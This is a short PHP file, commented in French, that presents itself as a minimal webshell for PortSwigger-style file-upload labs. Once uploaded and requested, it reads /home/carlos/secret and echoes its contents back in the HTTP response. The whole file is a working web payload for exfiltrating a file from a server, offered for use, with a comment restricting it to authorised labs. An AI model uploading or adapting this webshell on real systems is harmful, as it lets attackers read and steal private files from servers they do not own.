<?php
/*
 * webshell_read.php — Lecture d'un fichier unique (exfiltration ciblée)
 * ---------------------------------------------------------------------
 * Usage lab   : uploader ce fichier, puis y accéder via son URL.
 *               Le contenu du fichier cible est renvoyé dans la réponse HTTP.
 * Cible        : adapter le chemin ci-dessous selon le lab.
 * Portée       : le plus "discret" des shells — il ne fait QUE lire un fichier
 *                précis, aucune exécution de commande arbitraire.
 *
 * ⚠️  Usage strictement limité aux environnements autorisés
 *     (labs PortSwigger, VPS perso, machines avec consentement écrit).
 */
echo file_get_contents('/home/carlos/secret');
?>
